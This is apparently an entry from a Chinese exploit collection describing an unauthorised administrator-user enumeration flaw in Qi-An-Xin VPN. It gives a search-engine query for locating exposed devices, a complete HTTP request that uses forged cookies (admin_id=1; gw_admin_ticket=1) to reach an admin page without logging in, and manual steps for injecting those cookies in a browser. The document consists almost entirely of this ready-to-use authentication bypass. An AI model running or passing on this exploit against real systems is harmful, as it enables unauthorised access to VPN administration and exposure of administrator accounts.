# 奇安信 VPN 未授权管理用户遍历漏洞

## 网络测绘

hunter: app.name="奇安信 VPN"

## POC / EXP

```
GET /admin/group/x_group.php?id=1 HTTP/1.1
Host: 
Cookie: cookie=admin_id=1; gw_admin_ticket=1;
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

```
# 手动测试
1.使用cookie editor插件添加cookie值:
cookie=admin_id=1; gw_admin_ticket=1;
2.使用charset插件修改网页编码为utf-8使页面正常显示
```